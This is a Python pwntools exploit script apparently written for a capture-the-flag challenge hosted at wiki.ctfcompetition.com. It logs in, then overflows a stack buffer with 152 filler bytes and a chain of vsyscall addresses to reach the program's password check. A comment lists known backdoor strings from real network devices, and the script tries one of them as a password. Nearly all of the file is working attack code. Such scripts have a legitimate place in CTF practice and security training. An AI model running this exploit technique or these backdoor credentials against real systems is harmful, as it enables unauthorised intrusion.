#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
host = args.HOST or 'wiki.ctfcompetition.com'
port = int(args.PORT or 1337)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *0x555555554C2C
#b *0x555555554C4E
#b *0x555555554C85
#b *0x555555554d25
b *0x555555554CFB
b *0x555555554cad
#process_USER()
b *0x555555554DA1
continue
'''.format(**locals())

# Execute the target binary locally
def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

# Connect to the process on the remote host
def remote(argv=[], *a, **kw):
    io = connect(host, port)
    return io

start = local if args.LOCAL else remote

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start()
if args.GDB:
  gdb.attach(io, gdbscript=gdbscript)

io.clean()
'''
 xmlset_roodkcableoj28840ybtide
 Fortimanager_Access
 1MB@tMaN
'''

payload  = 'USER'
io.sendline(payload)

payload = ''
payload += '1MB@tMaN'
#payload += 'Fortimanager_Access'
#payload += 'xmlset_roodkcableoj28840ybtide'
io.sendline(payload)

payload  = 'PASS'
io.sendline(payload)

""" Without overwrites:
 â–º f 0     555555554cb4
   f 1     555555554d28
   f 2     555555554a8f
   f 3     2aaaaaceff45 
"""

io.clean()
#136 gets loaded to rbx
#144 gets loaded to rbp (pointer to user passwd)
#152 is our return
payload = "a"*152
payload += p64(0xffffffffff600000)*23
data = io.sendline(payload)
 
# Waiting for another READ.. pass zeros, since now program have the expected password
# pointing to NULL.
payload = p64(0)
data = io.sendline(payload)
print '-'*80
print io.recvall()

